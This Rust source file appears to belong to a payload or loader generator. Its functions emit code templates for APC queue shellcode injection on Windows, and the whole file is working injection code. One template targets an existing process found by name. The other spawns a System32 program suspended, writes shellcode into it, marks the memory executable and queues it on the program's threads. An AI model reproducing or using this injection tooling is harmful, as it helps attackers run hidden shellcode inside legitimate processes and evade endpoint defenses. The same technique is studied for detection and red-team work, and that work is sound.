pub fn apc_snippet(target: &str, spawn: bool) -> String {
    if spawn {
        apc_spawn_snippet(target)
    } else {
        apc_existing_snippet(target)
    }
}

fn apc_existing_snippet(target: &str) -> String {
    format!(
        r#"    // Injection: APC queue injection (existing process)
    {{
        use windows_sys::Win32::System::Memory::*;
        use windows_sys::Win32::System::Threading::*;
        use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
        use windows_sys::Win32::System::Diagnostics::Debug::*;
        use windows_sys::Win32::Foundation::*;
        use std::ffi::c_void;

        let target_name = "{target}";

        let pid = unsafe {{
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == INVALID_HANDLE_VALUE {{ std::process::exit(0); }}
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
            let mut found_pid: u32 = 0;
            if Process32FirstW(snap, &mut entry) != 0 {{
                loop {{
                    let name = String::from_utf16_lossy(
                        &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len())]
                    );
                    if name.to_lowercase() == target_name.to_lowercase() {{
                        found_pid = entry.th32ProcessID;
                        break;
                    }}
                    if Process32NextW(snap, &mut entry) == 0 {{ break; }}
                }}
            }}
            CloseHandle(snap);
            if found_pid == 0 {{ std::process::exit(0); }}
            found_pid
        }};

        let proc_handle = unsafe {{
            OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                0,
                pid,
            )
        }};
        if proc_handle.is_null() {{ std::process::exit(0); }}

        let remote_addr = unsafe {{
            VirtualAllocEx(
                proc_handle,
                std::ptr::null(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        }};
        if remote_addr.is_null() {{ std::process::exit(0); }}

        unsafe {{
            let mut bytes_written = 0;
            WriteProcessMemory(
                proc_handle,
                remote_addr,
                shellcode.as_ptr() as *const c_void,
                shellcode.len(),
                &mut bytes_written,
            );
        }}

        let mut old_protect = 0u32;
        unsafe {{
            VirtualProtectEx(
                proc_handle,
                remote_addr,
                shellcode.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );
        }}

        unsafe {{
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if snap != INVALID_HANDLE_VALUE {{
                let mut te: THREADENTRY32 = std::mem::zeroed();
                te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
                if Thread32First(snap, &mut te) != 0 {{
                    loop {{
                        if te.th32OwnerProcessID == pid {{
                            let thread_handle = OpenThread(THREAD_SET_CONTEXT, 0, te.th32ThreadID);
                            if !thread_handle.is_null() {{
                                QueueUserAPC(
                                    Some(std::mem::transmute(remote_addr)),
                                    thread_handle,
                                    0,
                                );
                                CloseHandle(thread_handle);
                            }}
                        }}
                        if Thread32Next(snap, &mut te) == 0 {{ break; }}
                    }}
                }}
                CloseHandle(snap);
            }}
        }}
        unsafe {{ CloseHandle(proc_handle); }}
    }}"#,
        target = target
    )
}

fn apc_spawn_snippet(target: &str) -> String {
    format!(
        r#"    // Injection: APC queue injection (spawn suspended)
    {{
        use windows_sys::Win32::System::Memory::*;
        use windows_sys::Win32::System::Threading::*;
        use windows_sys::Win32::System::Diagnostics::Debug::*;
        use windows_sys::Win32::Foundation::*;
        use std::ffi::c_void;

        let target_path: Vec<u16> = "C:\\Windows\\System32\\{target}"
            .encode_utf16().chain(std::iter::once(0)).collect();
        let mut si: STARTUPINFOW = unsafe {{ std::mem::zeroed() }};
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = unsafe {{ std::mem::zeroed() }};

        let created = unsafe {{
            CreateProcessW(
                target_path.as_ptr(),
                std::ptr::null_mut(),
                std::ptr::null(),
                std::ptr::null(),
                0,
                CREATE_SUSPENDED,
                std::ptr::null(),
                std::ptr::null(),
                &si,
                &mut pi,
            )
        }};
        if created == 0 {{ std::process::exit(0); }}

        let remote_addr = unsafe {{
            VirtualAllocEx(
                pi.hProcess,
                std::ptr::null(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        }};
        if remote_addr.is_null() {{
            unsafe {{ TerminateProcess(pi.hProcess, 0); }}
            std::process::exit(0);
        }}

        unsafe {{
            let mut bytes_written = 0;
            WriteProcessMemory(
                pi.hProcess,
                remote_addr,
                shellcode.as_ptr() as *const c_void,
                shellcode.len(),
                &mut bytes_written,
            );
        }}

        let mut old_protect = 0u32;
        unsafe {{
            VirtualProtectEx(
                pi.hProcess,
                remote_addr,
                shellcode.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );
        }}

        unsafe {{
            QueueUserAPC(
                Some(std::mem::transmute(remote_addr)),
                pi.hThread,
                0,
            );
            ResumeThread(pi.hThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }}
    }}"#,
        target = target
    )
}
